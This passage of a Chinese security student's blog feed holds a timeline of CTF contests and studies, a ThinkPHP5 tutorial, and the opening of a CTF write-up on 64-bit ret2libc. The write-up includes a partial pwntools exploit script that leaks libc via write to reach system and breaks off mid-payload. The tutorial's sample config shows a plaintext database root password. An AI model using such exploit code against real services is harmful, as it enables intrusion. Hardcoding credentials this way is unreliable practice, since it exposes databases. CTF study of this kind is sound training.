        <content type="html"><![CDATA[<h4 id="大学第一次流水账"><a href="#大学第一次流水账" class="headerlink" title="大学第一次流水账"></a>大学第一次流水账</h4><table><thead><tr><th>时间</th><th>我的第一次</th></tr></thead><tbody><tr><td>2017/9</td><td>买了第一台笔记本，算是真的0基础，分不清内存还是磁盘，分不清显卡处理器，除了开机一无是处</td></tr><tr><td>2017/9</td><td>和导员第一次交流，内容是我觉得我什么都不会，大学如何生存，曹导的回答，基础一点都不重要，让我信心大增</td></tr><tr><td>2017/10</td><td>第一次听闻ctf-参加了ctf宣讲</td></tr><tr><td>2017/10</td><td>第一本计算机类书<a href="https://book.douban.com/subject/26869300/" target="_blank" rel="noopener">Python密码学编程</a>，拿python实现了基础加密解密</td></tr><tr><td>2017/10</td><td>第一次加入技术组织-odg项目组，开始接触技术和认识了优秀的学长,学习开发技术</td></tr><tr><td>2017/11/11</td><td>第一场ctf比赛-成绩很惨</td></tr><tr><td>2017/12~2018/3</td><td>第一次思考人生，四个月的纸醉金迷堕落生活,偶尔写写java，幸被曹师傅拽回来</td></tr><tr><td>2018/4</td><td>第一场省赛，参加了华为杯江苏省大学生网络安全精英邀请赛，第七名</td></tr><tr><td>2018/6</td><td>第一场国赛，只是线上，被学长带飞拿到了第一个国三</td></tr><tr><td>2018/6</td><td>第一次拿到了NISP的证书，虽然划水来的，但是还是很开心</td></tr><tr><td>2018/7~2018/9</td><td>专业第一桶金，大一暑假留在学校开发了MyDaXue教务处后端，相当于系统的整体了一遍后端开发，认识了创新区的优秀学长，拿到了工资和实习证明</td></tr><tr><td>2018/9</td><td>第一次写博客和使用github,在github开始写一些小的工具，博客记录自己的学习状态</td></tr><tr><td>2018/9</td><td>成立了第一个组织nuaa8086组织，核心思想是一起学习技术，包括了项目软件开发，ctf，游戏开发等，虽然这个组织凉了，但是对于我人生也是很重要的，无论是成立的手续，还是各种管理，印象比较深刻是缺少专业的js培训师，我直接邀请了暑假mydaxue开发组做react的一个留学生伙伴-Yuids,给8086小朋友们上了非常精彩的一节全英文js课，感谢一路上都有这些朋友相助，一年后8086的小朋友们在其他各个部门独当一面也是很欣慰的</td></tr><tr><td>2018/10</td><td>第一次接触创新区，十月份开始正式在创新区活动，当了网络部部长，不过也水了一年过去了，不过认识了更多优秀学长</td></tr><tr><td>2018/11</td><td>第一次挖洞渗透比赛，去成都参加360举办的一个挖洞的，虽然结果不太行，但是学习了真实渗透测试的知识和awvs的一些工具的使用</td></tr><tr><td>2019/2~2019/3</td><td>第一次跟从导师做项目，跟从刘亮老师完成移动终端智能预警系统，算是安全开发，认识了几个优秀的学长也拿到了不低的薪水</td></tr><tr><td>2019/4</td><td>第一次独立自由开发完整项目，开始着手写南航微软俱乐部官方网站及管理后台，由于想带学弟们，所以进度缓慢~但是不会咕咕咕的</td></tr><tr><td>2019/5</td><td>第一次算法比赛奖，南京航空航天大学第十三届程序设计竞赛二等奖，被玖哥哥带飞拿到了第一个算法的奖，呜呜呜深刻感到自己算法真的垃圾</td></tr><tr><td>2019/5</td><td>第一次偏应用的信息安全比赛奖，虎鲸杯全国大学生电子数据取证大赛最佳协作奖，打的第一场非ctf得安全竞赛，也感觉到了ctf和实战得偏差</td></tr><tr><td>2019/6</td><td>第一场正式的hackthon，和王国彬学长去华科参加了第一场hackthon，认识了影响我一生的独臂大神</td></tr><tr><td>2019/6</td><td>第一次学会了游泳和漂移板，也明白了生活不只有ctf和代码，运动和其他爱好也是需要的</td></tr><tr><td>2019/6</td><td>第一个awd奖，第二届“金科网安杯”网络攻防大赛三等奖，还是值得纪念，全web的awd，233</td></tr><tr><td>2019/7</td><td>第一个软件杯奖，第八届“中国软件杯”软件设计大赛全国三等奖，主要做的是redis缓存高可用，也是阿汤哥带飞的，纪念一下开始接触了分布式和高可用的一些知识</td></tr><tr><td>2019/7~2019/8</td><td>第一次参加信息安全夏令营,到贵阳大数据安全靶场参加CTP网络安全夏令营，认识了一些小伙伴，开始正式参与了渗透实战，拿到了安全成果一等奖和创新实践二等奖</td></tr><tr><td>2019/8</td><td>第一份远程工作吧，甲方一个人都没见过但是顺利完成了网站的搭建混到了一张另外实习证明，<a href="http://www.jxlxjkj.com/" target="_blank" rel="noopener">网站demo</a></td></tr><tr><td>2019/8</td><td>第一个国一等奖，全国大学生网络安全技能大赛全国一等奖，算第一个信安国一等奖了，也是awd,web被按在地上打，太惨了，不过还好没有自闭</td></tr><tr><td>2019/9</td><td>第一次当队长，开始管理asuri战队，新生培训，招新赛，队内管理等，真正意义上担任了管理人员，确实不太好当</td></tr><tr><td>2019/10</td><td>第一次拿奖学金和答辩拿到了第一份奖学金，参加了校长特别嘉奖答辩，明确了不读研的方向</td></tr></tbody></table><h4 id="记录曾经学习技术的路线"><a href="#记录曾经学习技术的路线" class="headerlink" title="记录曾经学习技术的路线"></a>记录曾经学习技术的路线</h4><p>由于本人大致时间在ctf上，所以ctf的细节就不记录了，其他的只是一些业余活动，算不上学会了，只能说了解了</p><table><thead><tr><th>时间</th><th>学习内容</th></tr></thead><tbody><tr><td>2017/9</td><td>入门计算机第一个语言-c语言</td></tr><tr><td>2017/10~现在</td><td>CTF</td></tr><tr><td>2017/10</td><td>使用python编写古典密码的加密解密小程序</td></tr><tr><td>2017/10~2017/11</td><td>在odg系统的学习了html,css,js</td></tr><tr><td>2017/11</td><td>开始嚼csapp,对自己的计算机素养得到了很大提升</td></tr><tr><td>2017/11</td><td>买了第一个服务器，不过只会安一个宝塔</td></tr><tr><td>2017/12</td><td>接触了jQuery,react这种或者库-包-框架的概念，不过前端框架没深究</td></tr><tr><td>2018/1~2018/2</td><td>正式接触了java web开发和mysql数据库的使用，第一遍spring mvc学习，中途放弃了，主要途径是阿汤哥教和自己倒腾</td></tr><tr><td>2018/1</td><td>选择了ctf-web方向，开始学习网络是怎么连接的和计算机网络自顶向下学习方法</td></tr><tr><td>2018/3</td><td>由于科创需要以及ctf中的安卓逆向问题，开始学习了安卓开发，基于《第一行安卓代码》</td></tr><tr><td>2018/4</td><td>由于ctf题目大多php，开始入坑php语言，主要基于菜鸟教学和《PHP和MySQL Web开发》</td></tr><tr><td>2018/5</td><td>大概第一遍过完了csapp,然后看了汇编语言，基于王爽的汇编</td></tr><tr><td>2018/6</td><td>在mydaxue教务处中学习了asp.net core类框架以及postgresql数据库的使用</td></tr><tr><td>2018/7</td><td>认真思考和推理过一些简单密码学问题比如rsa,md5,des,aes</td></tr><tr><td>2018/9</td><td>再一次认真思考了spring框架，掌握springboot的基础使用</td></tr><tr><td>2018/9</td><td>学习数据结构等通识课</td></tr><tr><td>2018/11</td><td>渗透实战的一些工具的使用</td></tr><tr><td>2018/12</td><td>入门django框架，用django框架写了2个项目练手，一个是<a href="https://github.com/Kit4y/Django2.1-Blog" target="_blank" rel="noopener">Django2.1博客</a>，一个是<a href="https://github.com/Kit4y/Crypto-Tools" target="_blank" rel="noopener">加解密在线网站</a></td></tr><tr><td>2019/2</td><td>开始做安全开发，主要就是移动终端智能预警系统设计socket编程等细节，再次熟练springboot的跨域权限等问题</td></tr><tr><td>2019/3</td><td>学习计组和做PA</td></tr><tr><td>2019/3</td><td>在hackthon中学了一下进程的通信，整了一个<a href="https://github.com/Kit4y/Unique_Hackday_Nice_fastStyle" target="_blank" rel="noopener">hackthon项目</a></td></tr><tr><td>2019/4</td><td>整了一下vue写了一下<a href="https://github.com/Kit4y/Nuaa_MSC_ForeEnd_Alpha" target="_blank" rel="noopener">微软俱乐部网站前端</a></td></tr><tr><td>2019/7</td><td>软件杯中学了一下<a href="https://www.bilibili.com/video/av59226544" target="_blank" rel="noopener">redis缓存高可用问题</a></td></tr><tr><td>2019/7</td><td>因为ctf题目越来越多flask的，系统学了一下flask框架的使用和一些安全问题</td></tr><tr><td>2019/8</td><td>接触了postgresql的内核分析的一些活，<a href="https://github.com/Kit4y/Postgresql" target="_blank" rel="noopener">postgresql学习记录</a></td></tr><tr><td>2019/10</td><td>学了一波thinkphp框架的使用</td></tr></tbody></table><h4 id="其他不痛不痒的事，做个笔记吧"><a href="#其他不痛不痒的事，做个笔记吧" class="headerlink" title="其他不痛不痒的事，做个笔记吧"></a>其他不痛不痒的事，做个笔记吧</h4><table><thead><tr><th>时间</th><th>一些经历</th></tr></thead><tbody><tr><td>2019/4</td><td>永信杯江苏省网络安全精英邀请赛二等奖，这次打到第四名，虽然还是很难受，但是感觉把奶冰带上了这条路也是很开心的</td></tr><tr><td>2019/7</td><td>第二次国赛，第十二届全国大学生信息安全竞赛全国二等奖，半决赛决赛都到，决赛圈真的感觉到自己的能力太差了太差了</td></tr><tr><td>2019/9</td><td>网络内生安全试验场 CTF 第一季夺旗赛第七名</td></tr><tr><td>2019/9</td><td>第三届强网杯优胜奖</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 世间温柔 </category>
          
          <category> 咪咪 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 有咪咪 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>倒腾thinkphp5的一些坑</title>
      <link href="/2019/11/19/dao-teng-thinkphp5-de-yi-xie-keng/"/>
      <url>/2019/11/19/dao-teng-thinkphp5-de-yi-xie-keng/</url>
      
        <content type="html"><![CDATA[<h3 id="一、Thinkphp5中No-input-file-specified-问题解决"><a href="#一、Thinkphp5中No-input-file-specified-问题解决" class="headerlink" title="一、Thinkphp5中No input file specified 问题解决"></a>一、Thinkphp5中No input file specified 问题解决</h3><p>.htaccess文件中的</p><pre><code>RewriteRule ^(.*)$ index.php/$1 [QSA,PT,L]</code></pre><p>在默认情况下会导致No input file specified.</p><p>修改成</p><pre><code>RewriteRule ^(.*)$ index.php [L,E=PATH_INFO:$1]</code></pre><p>官方教程<a href="https://www.kancloud.cn/manual/thinkphp5/content" target="_blank" rel="noopener">https://www.kancloud.cn/manual/thinkphp5/content</a></p><h3 id="二、路由"><a href="#二、路由" class="headerlink" title="二、路由"></a>二、路由</h3><p>关闭路由，完全使用默认的PATH_INFO方式URL：</p><pre><code>&#39;url_route_on&#39;  =&gt;  false,</code></pre><p>路由关闭后，不会解析任何路由规则，采用默认的PATH_INFO 模式访问URL：</p><pre><code>http://serverName/index.php/module/controller/action/param/value/...</code></pre><p>结构如图<br>其实可以省略index.php</p><pre><code>http://192.168.199.245/thinkphp_5.0.24/public/test/abc/eat/who/st4ck</code></pre><p><img src="1.png" alt="img"></p><p><img src="2.png" alt="img"></p><h3 id="三、绑定默认模块"><a href="#三、绑定默认模块" class="headerlink" title="三、绑定默认模块"></a>三、绑定默认模块</h3><p>在public下的index.php加上</p><pre><code>define(&#39;BIND_MODULE&#39;,&#39;test&#39;);</code></pre><p>切记一定要在<code>require __DIR__ . &#39;/../thinkphp/start.php&#39;;</code>之前<br>上方的url变为</p><pre><code>http://192.168.199.245/thinkphp_5.0.24/public/abc/eat/who/st4ck</code></pre><p>如果你的应用比较简单，模块和控制器都只有一个，那么可以在应用公共文件中绑定模块和控制器，如下：</p><pre><code>// 绑定当前访问到index模块的index控制器define(&#39;BIND_MODULE&#39;,&#39;test/abc&#39;);</code></pre><p>那么url又变成</p><pre><code>http://192.168.199.245/thinkphp_5.0.24/public/eat/who/st4ck</code></pre><h3 id="四、设置返回类型"><a href="#四、设置返回类型" class="headerlink" title="四、设置返回类型"></a>四、设置返回类型</h3><p>设置为json</p><pre><code>  &#39;default_return_type&#39;    =&gt; &#39;json&#39;,</code></pre><h3 id="五、控制器初始化"><a href="#五、控制器初始化" class="headerlink" title="五、控制器初始化"></a>五、控制器初始化</h3><pre><code>如果你的控制器类继承了\think\Controller类的话，可以定义控制器初始化方法_initialize，在该控制器的方法调用之前首先执行</code></pre><pre class=" language-PHP"><code class="language-PHP">namespace app\index\controller;use think\Controller;class Index extends Controller{    public function _initialize()    {        echo 'init';    }    public function hello()    {        return 'hello';    }    public function data()    {        return 'data';    }}</code></pre><p>如果访问<br><a href="http://localhost/index.php/index/Index/hello" target="_blank" rel="noopener">http://localhost/index.php/index/Index/hello</a></p><p>会输出</p><pre><code>inithello</code></pre><h3 id="六、数据库操作"><a href="#六、数据库操作" class="headerlink" title="六、数据库操作"></a>六、数据库操作</h3><p>前面嘚 <code>use think\Db;</code></p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get_em</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>db<span class="token punctuation">\</span>Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$query</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">table</span><span class="token punctuation">(</span><span class="token string">'emails'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> Db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>或者</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get_em</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> Db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">table</span><span class="token punctuation">(</span><span class="token string">'emails'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get_em</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> Db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">table</span><span class="token punctuation">(</span><span class="token string">'users'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>插入数据</p><pre class=" language-php"><code class="language-php">    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get_em</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>       <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'email_id'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'bar1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        Db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">table</span><span class="token punctuation">(</span><span class="token string">'emails'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>插入多数据</p><pre class=" language-php"><code class="language-php">    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get_em</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>       <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span>       <span class="token punctuation">[</span><span class="token string">'email_id'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'3333'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>       <span class="token punctuation">[</span><span class="token string">'email_id'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'2333'</span><span class="token punctuation">]</span>       <span class="token punctuation">]</span><span class="token punctuation">;</span>        Db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">table</span><span class="token punctuation">(</span><span class="token string">'emails'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">insertAll</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>更新数据</p><pre class=" language-php"><code class="language-php">Db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">table</span><span class="token punctuation">(</span><span class="token string">'think_user'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'name'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'thinkphp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>删除数据</p><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">// 根据主键删除</span>Db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">table</span><span class="token punctuation">(</span><span class="token string">'think_user'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">table</span><span class="token punctuation">(</span><span class="token string">'think_user'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 条件删除    </span>Db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">table</span><span class="token punctuation">(</span><span class="token string">'think_user'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">table</span><span class="token punctuation">(</span><span class="token string">'think_user'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">,</span><span class="token string">'&lt;'</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="七、模型绑定"><a href="#七、模型绑定" class="headerlink" title="七、模型绑定"></a>七、模型绑定</h3><p>和传统mvc一样，一个ef框架<br>先新建一个model</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>test<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token keyword">extends</span> <span class="token class-name"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>Model</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 设置当前模型对应的完整数据表名称</span>    <span class="token keyword">protected</span> <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token string">'emails'</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>默认优先使用外部设定的数据库，也可以自己拟定</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>test<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token keyword">extends</span> <span class="token class-name"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>Model</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 设置当前模型对应的完整数据表名称</span>    <span class="token keyword">protected</span> <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token string">'emails'</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 设置当前模型的数据库连接</span>    <span class="token keyword">protected</span> <span class="token variable">$connection</span> <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token comment" spellcheck="true">// 数据库类型</span>        <span class="token string">'type'</span>        <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'mysql'</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// 服务器地址</span>        <span class="token string">'hostname'</span>    <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// 数据库名</span>        <span class="token string">'database'</span>    <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'security'</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// 数据库用户名</span>        <span class="token string">'username'</span>    <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'root'</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// 数据库密码</span>        <span class="token string">'password'</span>    <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'liu19990808'</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// 数据库编码默认采用utf8</span>        <span class="token string">'charset'</span>     <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'utf8'</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// 数据库表前缀</span>        <span class="token string">'prefix'</span>      <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'think_'</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// 数据库调试模式</span>        <span class="token string">'debug'</span>       <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">false</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>然后controller要使用</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">set_mo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 实例化模型</span>    <span class="token variable">$user</span> <span class="token operator">=</span> User<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$user</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>前面需要加上</p><pre class=" language-php"><code class="language-php"><span class="token keyword">use</span> <span class="token package">app<span class="token punctuation">\</span>test<span class="token punctuation">\</span>model<span class="token punctuation">\</span>User</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Db</span><span class="token punctuation">;</span></code></pre><p>修改属性</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">set_mo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 实例化模型</span>    <span class="token variable">$user</span> <span class="token operator">=</span> User<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">email_id</span><span class="token operator">=</span><span class="token string">'hello kitty'</span><span class="token punctuation">;</span>    <span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$user</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="八、模板"><a href="#八、模板" class="headerlink" title="八、模板"></a>八、模板</h3><p>模板路径倒是很奇怪的样子</p><p><img src="3.png" alt="img"></p><p>然后就是一些模板语法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">fetch1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$view</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">View</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$view</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token string">'thinkphp'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$view</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><pre class=" language-html"><code class="language-html">Hello,{$name}！</code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>64位elf的ret2libc</title>
      <link href="/2019/11/19/64-wei-elf-de-ret2libc/"/>
      <url>/2019/11/19/64-wei-elf-de-ret2libc/</url>
      
        <content type="html"><![CDATA[<h4 id="不同点"><a href="#不同点" class="headerlink" title="不同点"></a>不同点</h4><p>主要是32位的参数丢栈上，而64位的函数前6个参数丢寄存器上<br>x86-64环境下非微软操作系统的前六个整型参数通过寄存器传递,按顺序为:rdi,rsi,rdx,rcx,r8,r9.同时XMM0到XMM7用来放置浮点变元,通过栈传递参数时所有的数据大小都向8的倍数对齐.</p><p>再回味一下这两个函数<br>ps:read函数</p><pre><code>ssize_t read(int fd, void *buf, size_t count);</code></pre><p>函数的参数【int fd】：这个是文件指针<br>函数的参数【void *buf】：读上来的数据保存在缓冲区buf中，同时文件的当前读写位置向后移<br>函数的参数【size_t count】：是请求读取的字节数。若参数count 为0, 则read()不会有作用并返回0. 返回值为实际读取到的字节数, 如果返回0<br>read()会把参数fd 所指的文件传送count个字节到buf指针所指的内存中</p><p>write函数</p><pre><code>ssize_t write(int fd,const void *buf,size_t nbytes) </code></pre><p>把缓冲区(buf)的前nbytes个字节写入与文件描述符(fildes)关联的文件。<br>write返回实际写入的字节数，如果文件描述符有错误或者底层设备的驱动程序对数据长度比<br>较敏感，表示在write调用中出现了错误，返回值可能会小于nbytes。如果函数返回0，表示<br>未写入任何数据；返回-1表示write调用中出现了错误，错误代码保存在全局变量errno中<br>fd为1的时候是标准输出流<br><code>puts直接传地址，gets和read函数基本差不多</code></p><h3 id="一道题目easyrop"><a href="#一道题目easyrop" class="headerlink" title="一道题目easyrop"></a>一道题目easyrop</h3><p>ida打开<br>主函数</p><pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-10h]</span>  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"easy_rop"</span><span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x64uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="1.png" alt="img"></p><p>确定思想为通过write拿到libc地址，调用system-getflag</p><p>计算偏移为0x10+0x8=0x18</p><p>一步步算下去即可</p><p>exp</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'gnome-terminal'</span><span class="token punctuation">,</span><span class="token string">'-x'</span><span class="token punctuation">,</span><span class="token string">'sh'</span><span class="token punctuation">,</span><span class="token string">'-c'</span><span class="token punctuation">]</span>sh<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sh=remote('49.235.243.206','8004')</span>ret2libc3<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#pwnlib.gdb.attach(sh,'b *0x40070F')</span>main_addr<span class="token operator">=</span><span class="token number">0x4006CD</span>pop_rsi_r15_addr<span class="token operator">=</span><span class="token number">0x400771</span>pop_rdi_addr<span class="token operator">=</span><span class="token number">0x400773</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"main地址：0x"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print(ret2libc3.got)</span><span class="token comment" spellcheck="true">#rdi放1 rsi放got表中write地址</span>payload<span class="token operator">=</span><span class="token string">'f'</span><span class="token operator">*</span><span class="token 